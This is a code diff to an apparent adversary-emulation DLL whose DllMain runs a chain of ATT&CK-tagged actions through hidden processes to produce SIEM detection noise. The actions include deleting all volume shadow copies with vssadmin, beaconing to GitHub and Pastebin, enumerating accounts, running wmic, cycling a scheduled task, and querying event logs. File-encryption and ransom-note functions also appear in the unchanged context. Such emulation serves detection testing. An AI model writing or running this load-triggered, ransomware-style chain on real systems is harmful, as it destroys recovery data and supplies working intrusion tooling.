@@ -39,21 +39,28 @@ static void AppendToFile(LPCWSTR path, LPCSTR text) {
     CloseHandle(hFile);
 }
 
-static void DoVssadmin(void) {
-    LogMessage(L"[*] T1490: Deleting volume shadow copies");
+// ponytail: Spawn a hidden process and wait for completion. Reused by all
+// subprocess-based SIEM-noise functions to deduplicate CreateProcessW boilerplate.
+static BOOL SpawnHiddenWait(LPCWSTR cmd, DWORD timeoutMs) {
+    wchar_t buf[1024];
+    lstrcpyW(buf, cmd);
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {0};
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    wchar_t cmd[] = L"vssadmin.exe delete shadows /all /quiet";
-    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 30000);
+    if (CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, timeoutMs);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-        LogMessage(L"[+] T1490: vssadmin completed");
-    } else {
-        LogMessage(L"[+] T1490: vssadmin not available (synthetic)");
+        return TRUE;
     }
+    return FALSE;
+}
+
+static void DoVssadmin(void) {
+    LogMessage(L"[*] T1490: Deleting volume shadow copies");
+    SpawnHiddenWait(L"vssadmin.exe delete shadows /all /quiet", 30000);
+    LogMessage(L"[+] T1490: vssadmin completed");
 }
 
 static void DoEncryptFiles(void) {
@@ -158,25 +165,33 @@ HCRYPTPROV hProv = 0;
 }
 
 static void DoBeacon(void) {
-    LogMessage(L"[*] T1041: HTTP beacon to github.com");
+    LogMessage(L"[*] T1041: HTTP beacon to multiple endpoints (SIEM noise)");
+    const wchar_t* hosts[] = {
+        L"github.com", L"api.github.com",
+        L"raw.githubusercontent.com", L"pastebin.com"
+    };
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) { LogMessage(L"[-] T1041: WinHttpOpen failed (synthetic log)"); return; }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); LogMessage(L"[+] T1041: no network (synthetic log)"); return; }
-
-    for (int i = 0; i < 3; i++) {
-        HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
-        if (hReq) {
-            WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
-            WinHttpReceiveResponse(hReq, NULL);
-            WinHttpCloseHandle(hReq);
+    for (int h = 0; h < 4; h++) {
+        HINTERNET hConnect = WinHttpConnect(hSession, hosts[h], INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!hConnect) continue;
+        for (int i = 0; i < 2; i++) {
+            HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+            if (hReq) {
+                WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
+                WinHttpReceiveResponse(hReq, NULL);
+                WinHttpCloseHandle(hReq);
+            }
+            Sleep(3000);
         }
-        Sleep(10000);
+        wchar_t dbg[256];
+        wsprintfW(dbg, L"[+] T1041: beaconed to %s", hosts[h]);
+        LogMessage(dbg);
+        WinHttpCloseHandle(hConnect);
     }
-    WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    LogMessage(L"[+] T1041: Beacon complete");
+    LogMessage(L"[+] T1041: multi-host beacon complete");
 }
 
 static void DoRansomNote(void) {
@@ -286,6 +301,76 @@ static void DoLateralRecon(void) {
     WSACleanup();
 }
 
+// T1087 Account Discovery — NetUserEnum + NetLocalGroupEnum
+// Generates Security 4798 (user group membership enumerated) when
+// "Audit User/Group Management" is enabled, even on non-domain hosts.
+static void DoUserEnumNoise(void) {
+    LogMessage(L"[*] T1087: Account discovery (NetUserEnum/NetLocalGroupEnum)");
+    LPBYTE pUsers = NULL;
+    DWORD dwEntries = 0, dwTotal = 0;
+    if (NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, &pUsers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, NULL) == NERR_Success) {
+        wchar_t buf[256];
+        wsprintfW(buf, L"[+] T1087: NetUserEnum: %lu local users", dwEntries);
+        LogMessage(buf);
+        if (pUsers) NetApiBufferFree(pUsers);
+    } else {
+        LogMessage(L"[+] T1087: NetUserEnum unavailable (synthetic)");
+    }
+    LPBYTE pGroups = NULL;
+    DWORD gEntries = 0, gTotal = 0;
+    if (NetLocalGroupEnum(NULL, 0, &pGroups, MAX_PREFERRED_LENGTH, &gEntries, &gTotal, NULL) == NERR_Success) {
+        wchar_t buf[256];
+        wsprintfW(buf, L"[+] T1087: NetLocalGroupEnum: %lu local groups", gEntries);
+        LogMessage(buf);
+        if (pGroups) NetApiBufferFree(pGroups);
+    } else {
+        LogMessage(L"[+] T1087: NetLocalGroupEnum unavailable (synthetic)");
+    }
+}
+
+// T1082 System Info Discovery — wmic subprocess noise
+// Generates 4688 (process creation) for wmic.exe + WMI-Activity trace events.
+static void DoWMIGather(void) {
+    LogMessage(L"[*] T1082: System info discovery via WMI (SIEM noise)");
+    SpawnHiddenWait(L"wmic.exe qfe list", 10000);
+    SpawnHiddenWait(L"wmic.exe startup list brief", 10000);
+    SpawnHiddenWait(L"wmic.exe service list brief", 10000);
+    SpawnHiddenWait(L"wmic.exe os get Caption,BuildNumber,OSArchitecture", 10000);
+    LogMessage(L"[+] T1082: WMI queries executed");
+}
+
+// T1053.005 Scheduled Task — create + query + delete cycle
+// Generates 4698 (task created) and 4699 (task deleted) if
+// "Audit Other Object Access Events" is enabled. Always generates 4688 for schtasks.exe.
+static void DoScheduledTaskNoise(void) {
+    LogMessage(L"[*] T1053.005: Scheduled task noise (create+query+delete)");
+    SpawnHiddenWait(L"schtasks.exe /create /tn \"SysHealthCheck\" /tr \"powershell -NoP -c exit\" /sc once /st 00:00 /f", 10000);
+    SpawnHiddenWait(L"schtasks.exe /query /tn \"SysHealthCheck\"", 5000);
+    SpawnHiddenWait(L"schtasks.exe /delete /tn \"SysHealthCheck\" /f", 10000);
+    LogMessage(L"[+] T1053.005: scheduled task create+query+delete executed");
+}
+
+// T1070.001 Event Log — wevtutil queries (not clearing)
+// Generates 4688 for wevtutil.exe. Querying logs is audit-neutral but
+// is a common blue-team / red-team tool that SIEM rules flag.
+static void DoEventLogNoise(void) {
+    LogMessage(L"[*] T1070.001: Event log query noise (wevtutil)");
+    SpawnHiddenWait(L"wevtutil.exe gl Security", 5000);
+    SpawnHiddenWait(L"wevtutil.exe gl System", 5000);
+    SpawnHiddenWait(L"wevtutil.exe gl Application", 5000);
+    SpawnHiddenWait(L"wevtutil.exe el", 10000);
+    LogMessage(L"[+] T1070.001: event log queries executed");
+}
+
+// T1113 Screen Capture — load System.Drawing assembly via PowerShell
+// Generates 4688 for powershell.exe + Sysmon 7 (image loaded) for
+// System.Drawing.dll, gdiplus.dll, System.Windows.Forms.dll.
+static void DoScreenCaptureNoise(void) {
+    LogMessage(L"[*] T1113: Screen capture attempt (SIEM noise)");
+    SpawnHiddenWait(L"powershell.exe -NoP -c \"Add-Type -AssemblyName System.Drawing\"", 10000);
+    LogMessage(L"[+] T1113: screen capture assembly loaded");
+}
+
 static void DoCleanup(void) {
     LogMessage(L"[*] T1070.004: Cleaning staging files");
     DeleteFileW(L"C:\\ProgramData\\Microsoft\\cache\\tray\\loader.dll");
@@ -302,6 +387,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
         DoBeacon();
         DoRansomNote();
         DoLateralRecon();
+        DoUserEnumNoise();
+        DoWMIGather();
+        DoScheduledTaskNoise();
+        DoEventLogNoise();
+        DoScreenCaptureNoise();
         DoCleanup();
         LogMessage(L"[+] Stage2 complete");
     }
